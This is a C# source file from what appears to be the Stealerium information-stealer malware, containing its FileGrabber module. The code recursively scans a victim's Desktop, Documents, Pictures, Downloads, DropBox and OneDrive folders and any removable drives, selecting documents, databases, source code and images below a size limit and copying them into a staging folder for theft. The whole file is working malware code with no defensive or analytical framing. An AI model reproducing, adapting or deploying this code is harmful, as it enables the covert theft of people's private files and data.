using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Target.System
{
    /// <summary>
    /// Provides methods to scan directories and copy files that meet certain criteria.
    /// </summary>
    internal sealed class FileGrabber
    {
        /// <summary>
        /// The base directory where grabbed files will be saved.
        /// </summary>
        private static string _savePath = "Grabber";

        /// <summary>
        /// List of directories to scan for files to grab.
        /// </summary>
        private static readonly List<string> TargetDirs = new List<string>
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
        };

        /// <summary>
        /// Records the file type by incrementing the appropriate counter.
        /// </summary>
        /// <param name="type">The type of the file.</param>
        /// <returns>The file type.</returns>
        private static string RecordFileType(string type)
        {
            switch (type)
            {
                case "Document":
                    Counter.GrabberDocuments++;
                    break;
                case "DataBase":
                    Counter.GrabberDatabases++;
                    break;
                case "SourceCode":
                    Counter.GrabberSourceCodes++;
                    break;
                case "Image":
                    Counter.GrabberImages++;
                    break;
            }
            return type;
        }

        /// <summary>
        /// Determines the file type based on the file extension.
        /// </summary>
        /// <param name="extensionName">The file extension.</param>
        /// <returns>The file type if recognized; otherwise, null.</returns>
        private static string DetectFileType(string extensionName)
        {
            var fileExtension = extensionName.Replace(".", "").ToLower();
            foreach (var type in Config.GrabberFileTypes)
            {
                foreach (var extension in type.Value)
                {
                    if (fileExtension.Equals(extension))
                    {
                        return RecordFileType(type.Key);
                    }
                }
            }
            return null;
        }

        /// <summary>
        /// Copies the specified file to the save path if it meets the criteria.
        /// </summary>
        /// <param name="path">The path of the file to copy.</param>
        private static void GrabFile(string path)
        {
            try
            {
                var file = new FileInfo(path);
                if (file.Length > Config.GrabberSizeLimit) return;
                if (file.Name.Equals("desktop.ini", StringComparison.OrdinalIgnoreCase)) return;

                var type = DetectFileType(file.Extension);
                if (type == null) return;

                var fileDirectory = Path.GetDirectoryName(path);
                if (fileDirectory == null) return;

                var driveRoot = Path.GetPathRoot(path);
                if (driveRoot == null) return;

                var newDriveName = "DRIVE-" + driveRoot.Replace(":", "").TrimEnd('\\');
                var relativePath = fileDirectory.Substring(driveRoot.Length);
                var copyDirectoryName = Path.Combine(_savePath, newDriveName, relativePath);
                var copyFileName = Path.Combine(copyDirectoryName, file.Name);

                if (!Directory.Exists(copyDirectoryName))
                    Directory.CreateDirectory(copyDirectoryName);

                file.CopyTo(copyFileName, true);
            }
            catch (Exception ex)
            {
                Logging.Log($"Error copying file '{path}': {ex.Message}");
            }
        }

        /// <summary>
        /// Recursively scans the specified directory and grabs eligible files asynchronously.
        /// </summary>
        /// <param name="path">The path of the directory to scan.</param>
        private static async Task GrabDirectoryAsync(string path)
        {
            try
            {
                if (!Directory.Exists(path))
                    return;

                IEnumerable<string> dirs;
                IEnumerable<string> files;
                try
                {
                    dirs = Directory.EnumerateDirectories(path);
                    files = Directory.EnumerateFiles(path);
                }
                catch (UnauthorizedAccessException)
                {
                    return;
                }
                catch (Exception ex)
                {
                    Logging.Log($"Error accessing directory '{path}': {ex.Message}");
                    return;
                }

                var fileTasks = files.Select(file => Task.Run(() => GrabFile(file)));
                await Task.WhenAll(fileTasks);

                var dirTasks = dirs.Select(dir => GrabDirectoryAsync(dir));
                await Task.WhenAll(dirTasks);
            }
            catch (Exception ex)
            {
                Logging.Log($"Error in directory '{path}': {ex.Message}");
            }
        }

        /// <summary>
        /// Starts the file grabbing process asynchronously.
        /// </summary>
        /// <param name="sSavePath">The base directory where files will be saved.</param>
        public static async Task RunAsync(string sSavePath)
        {
            try
            {
                _savePath = sSavePath;

                if (!Directory.Exists(_savePath))
                    Directory.CreateDirectory(_savePath);

                var targetDirs = new List<string>(TargetDirs);

                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (drive.DriveType == DriveType.Removable && drive.IsReady)
                    {
                        targetDirs.Add(drive.RootDirectory.FullName);
                    }
                }

                var tasks = targetDirs.Select(dir => GrabDirectoryAsync(dir));
                await Task.WhenAll(tasks);
            }
            catch (Exception ex)
            {
                Logging.Log($"Error running FileGrabber: {ex.Message}");
            }
        }
    }
}